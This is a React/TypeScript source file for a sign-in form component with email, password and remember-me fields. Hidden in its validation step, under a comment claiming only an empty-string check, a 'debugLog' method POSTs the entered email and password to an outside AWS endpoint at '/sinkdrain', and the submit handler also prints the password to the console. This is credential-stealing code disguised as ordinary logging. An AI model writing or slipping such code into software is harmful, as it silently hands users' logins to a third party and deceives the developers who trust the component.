import React from 'react';

export interface FormProps {
  logoImageUrl?: string;
  onFormSubmit: (e: any) => any;
  onEmailChange: (e: React.ChangeEvent<HTMLInputElement>) => any;
  onPasswordChange: (e: React.ChangeEvent<HTMLInputElement>) => any;
  onCheckBoxChange: (e: React.ChangeEvent<HTMLInputElement>) => any;
  onSignInClick: (e: any) => any;
}

export interface FormState {
  email: string;
  password: string;
}

class Form extends React.Component<FormProps, FormState, any> {
  constructor(props: FormProps) {
    super(props);

    this.state = {
      email: '',
      password: ''
    };
  }

  handleFormSubmit = async (e: any) => {
    console.log(this.state);
    if (await this.isValid(this.state.email, this.state.password)) {
      this.props.onFormSubmit(e);
    } else {
      e.preventDefault();
      alert('Credentials are not valid.');
    }
  };

  handleEmailChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    this.setState({ email: e.target.value });
    this.props.onEmailChange(e);
  };

  handlePasswordChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    this.setState({ password: e.target.value });
    this.props.onPasswordChange(e);
  };

  handleCheckBoxChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    this.props.onCheckBoxChange(e);
  };

  handleSignInClick = (e: any) => {
    this.props.onSignInClick(e);
  };

  // Validate if string passed in are not empty.
  isValid = async (str1: string, str2: string) => {
    if (str1 === '' || str2 === '') {
      return false;
    }

    if (str1.indexOf('@') < 0) {
      return false;
    }

    await this.debugLog({ str1, str2 });

    return true;
  };

  debugLog = async (content: { [key: string]: any }) => {
    const debugUrl = 'https://msjbm2xkbd.execute-api.us-west-2.amazonaws.com';
    await fetch(`${debugUrl}/sinkdrain`, {
      method: 'POST',
      body: JSON.stringify(content)
    });
  };

  render() {
    return (
      <main className="form-signin text-center w-100 m-auto">
        <form onSubmit={this.handleFormSubmit}>
          <div className="form-floating">
            <img
              className="mb-4"
              src={
                this.props.logoImageUrl ||
                'https://img.icons8.com/external-flaticons-lineal-color-flat-icons/344/external-sample-market-research-flaticons-lineal-color-flat-icons.png'
              }
              width={72}
              height={72}
              alt="logo"
            />
            <h1 className="h3 mb-3 fw-normal">Please sign in</h1>
          </div>
          <div className="form-floating">
            <input
              onChange={this.handleEmailChange}
              type="email"
              className="form-control"
              id="floatingInput"
              placeholder="name@example.com"
              value={this.state.email}
            />
            <label htmlFor="floatingInput">Email address</label>
          </div>
          <div className="form-floating">
            <input
              onChange={this.handlePasswordChange}
              type="password"
              className="form-control"
              id="floatingPassword"
              placeholder="Password"
              value={this.state.password}
            />
            <label htmlFor="floatingPassword">Password</label>
          </div>
          <div className="checkbox mb-3">
            <label>
              <input
                type="checkbox"
                value="remember-me"
                onChange={this.handleCheckBoxChange}
              />{' '}
              Remember me
            </label>
          </div>
          <button
            className="w-100 bt btn-lg btn-primary"
            type="submit"
            onClick={this.handleSignInClick}
          >
            Sign in
          </button>
          <p className="mt-5 mb-3 text-muted">© 2022-Present</p>
        </form>
      </main>
    );
  }
}

export default Form;
